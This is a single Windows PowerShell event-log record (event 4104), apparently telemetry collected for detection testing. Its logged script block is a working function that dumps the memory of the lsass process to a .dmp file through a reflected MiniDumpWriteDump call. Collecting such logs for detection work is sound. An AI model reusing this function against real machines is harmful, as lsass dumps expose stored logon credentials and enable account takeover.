{
  "time": "2020-06-30t14:24:08.2546050z",
  "event_src.title": "microsoft-windows-powershell",
  "event_src.subsys": "powershell",
  "event_src.vendor": "microsoft",
  "event_src.hostname": "msedgewin10",
  "event_src.id": "4104",
  "event_src.category": "microsoft-windows-powershell/operational",
  "object.value": "function memory($path) { $process = get-process lsass $dumpfilepath = $path $wer = [psobject].assembly.gettype('system.management.automation.windowserrorreporting') $wernativemethods = $wer.getnestedtype('nativemethods', 'nonpublic') $flags = [reflection.bindingflags] 'nonpublic, static' $minidumpwritedump = $wernativemethods.getmethod('minidumpwritedump', $flags) $minidumpwithfullmemory = [uint32] 2 # $processid = $process.id $processname = $process.name $processhandle = $process.handle $processfilename = \"$($processname).dmp\" $processdumppath = join-path $dumpfilepath $processfilename $filestream = new-object io.filestream($processdumppath, [io.filemode]::create) $result = $minidumpwritedump.invoke($null, @($processhandle, $processid, $filestream.safefilehandle, $minidumpwithfullmemory, [intptr]::zero, [intptr]::zero, [intptr]::zero)) $filestream.close() if (-not $result) { $exception = new-object componentmodel.win32exception $exceptionmessage = \"$($exception.message) ($($processname):$($processid))\" # remove any partially written dump files. for example, a partial dump will be written # in the case when 32-bit powershell tries to dump a 64-bit process. remove-item $processdumppath -erroraction silentlycontinue throw $exceptionmessage } else { \"memdump complete!\" } }"
}